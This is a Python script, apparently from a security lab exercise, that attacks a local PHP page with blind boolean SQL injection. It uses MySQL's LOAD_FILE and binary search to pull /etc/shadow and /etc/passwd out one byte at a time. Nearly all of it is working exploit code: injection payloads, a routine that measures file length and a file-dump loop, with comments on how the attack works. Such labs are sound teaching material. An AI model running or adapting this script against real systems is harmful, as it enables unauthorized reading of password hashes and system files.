# Part 9 - Attempt to read /etc/shadow (or similar sensitive files) via Blind SQLi + LOAD_FILE.
#
# Strategy:
#   MySQL's LOAD_FILE() can read arbitrary files IF the DB user has the FILE privilege
#   AND the file is readable by the OS user running MySQL.
#
#   /etc/shadow is owned by root and readable only by root (or shadow group).
#   MySQL typically runs as the 'mysql' OS user, so LOAD_FILE('/etc/shadow') will return
#   NULL — the query silently fails and we get an empty result.
#
#   /etc/passwd is world-readable, so we use it as a control to confirm LOAD_FILE works
#   at all. If even passwd returns empty, the MySQL user lacks the FILE privilege entirely.
#
# How this helps:
#   - If LOAD_FILE succeeds on /etc/shadow → we dump the hashed passwords.
#   - If it fails only on /etc/shadow but works on /etc/passwd → we know FILE works but
#     the OS permissions block shadow (the most common outcome).
#   - If both fail → the MySQL user has no FILE privilege at all.

import time
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

URL = "http://localhost:8000/blindsqli.php"
TRUE_INDICATOR = "In wonderland right now"

MY_COOKIES = {
    'PHPSESSID': '414170264f5da76958870da216138b7c'
}

# Session with automatic retries on connection errors
_session = requests.Session()
_adapter = HTTPAdapter(max_retries=Retry(total=5, backoff_factor=0.3,
                                         status_forcelist=[500, 502, 503, 504]))
_session.mount("http://", _adapter)


def _get(params: dict) -> requests.Response:
    """GET with retry + brief back-off on RemoteDisconnected."""
    for attempt in range(5):
        try:
            return _session.get(URL, params=params, cookies=MY_COOKIES, timeout=10)
        except requests.exceptions.ConnectionError:
            if attempt == 4:
                raise
            time.sleep(0.5 * (attempt + 1))


def path_to_char(path: str) -> str:
    """Encode a file path as SQL CHAR(...) to avoid quote-escaping issues."""
    return "CHAR(" + ",".join(str(ord(c)) for c in path) + ")"


def check_connection() -> bool:
    res = _get({'user': "alice' AND 1=1 #"})
    ok = TRUE_INDICATOR in res.text
    print("Sanity check:", "PASSED" if ok else "FAILED")
    return ok


def file_is_readable(path: str) -> bool:
    """Return True if LOAD_FILE returns a non-NULL result for the given path."""
    path_char = path_to_char(path)
    payload = f"alice' AND LOAD_FILE({path_char}) IS NOT NULL #"
    res = _get({'user': payload})
    return TRUE_INDICATOR in res.text


def get_file_length(path_char: str) -> int:
    """Binary-search for the exact byte length of the file (0 = unreadable/empty)."""
    res = _get({'user': f"alice' AND LENGTH(LOAD_FILE({path_char}))>0 #"})
    if TRUE_INDICATOR not in res.text:
        return 0

    lo, hi = 1, 8192
    while lo < hi:
        mid = (lo + hi + 1) // 2
        res = _get({'user': f"alice' AND LENGTH(LOAD_FILE({path_char}))>={mid} #"})
        if TRUE_INDICATOR in res.text:
            lo = mid
        else:
            hi = mid - 1
    return lo


def read_byte_bsearch(path_char: str, pos: int) -> int:
    """Binary-search the byte value at position `pos` (1-based). 8 requests per byte."""
    lo, hi = 0, 255
    while lo < hi:
        mid = (lo + hi) // 2
        # Is the byte value > mid?
        res = _get({'user': f"alice' AND ASCII(SUBSTRING(LOAD_FILE({path_char}),{pos},1))>{mid} #"})
        if TRUE_INDICATOR in res.text:
            lo = mid + 1
        else:
            hi = mid
    return lo


def read_file(path: str) -> bytes:
    """Read a file via blind boolean SQLi using binary search (8 req/byte)."""
    path_char = path_to_char(path)

    print(f"  Checking readability of {path!r} ... ", end='', flush=True)
    if not file_is_readable(path):
        print("NOT READABLE (NULL returned by LOAD_FILE)")
        return b""

    print("READABLE — measuring length...", end='', flush=True)
    length = get_file_length(path_char)
    print(f" {length} bytes")

    if length == 0:
        return b""

    data = []
    print("  Reading: ", end='', flush=True)
    for i in range(1, length + 1):
        byte_val = read_byte_bsearch(path_char, i)
        data.append(byte_val)
        ch = chr(byte_val) if 32 <= byte_val < 127 else f"\\x{byte_val:02x}"
        print(ch, end='', flush=True)
    print()
    return bytes(data)


def main():
    print("=" * 60)
    print("Part 9 – Attempting to read /etc/shadow via LOAD_FILE SQLi")
    print("=" * 60)

    if not check_connection():
        print("Cannot reach the server. Aborting.")
        return

    # ----------------------------------------------------------------
    # Step 1: the real target — /etc/shadow
    # ----------------------------------------------------------------
    print("\n[Step 1] Attempting to read /etc/shadow")
    shadow_data = read_file("/etc/shadow")
    if shadow_data:
        print(f"\n  SUCCESS! /etc/shadow ({len(shadow_data)} bytes):")
        print(shadow_data.decode("latin-1", errors="replace"))
        print("\n  Hex dump:")
        print(shadow_data.hex())
    else:
        print("\n  RESULT: /etc/shadow returned NULL (unreadable).")
        print("  Explanation:")
        print("    /etc/shadow is owned by root with mode 640 (readable only")
        print("    by root / the 'shadow' group). MySQL runs as the 'mysql'")
        print("    OS user, which is not in that group, so the kernel refuses")
        print("    the open() call and LOAD_FILE() returns NULL.")

    # ----------------------------------------------------------------
    # Step 2: control test — /etc/passwd (world-readable, confirms FILE
    #         privilege is present; the failure above is OS permissions,
    #         not a missing FILE privilege)
    # ----------------------------------------------------------------
    print("\n[Step 2] Control test: /etc/passwd (world-readable)")
    passwd_data = read_file("/etc/passwd")
    if passwd_data:
        print(f"\n  /etc/passwd ({len(passwd_data)} bytes):")
        print(passwd_data.decode("latin-1", errors="replace"))
        print("\n  Conclusion: LOAD_FILE works — the MySQL user has the FILE")
        print("  privilege. /etc/shadow failed purely because of OS-level")
        print("  permissions, not a missing SQL privilege.")
    else:
        print("\n  RESULT: /etc/passwd is also unreadable.")
        print("  Conclusion: the MySQL user lacks the FILE privilege entirely.")


if __name__ == "__main__":
    main()
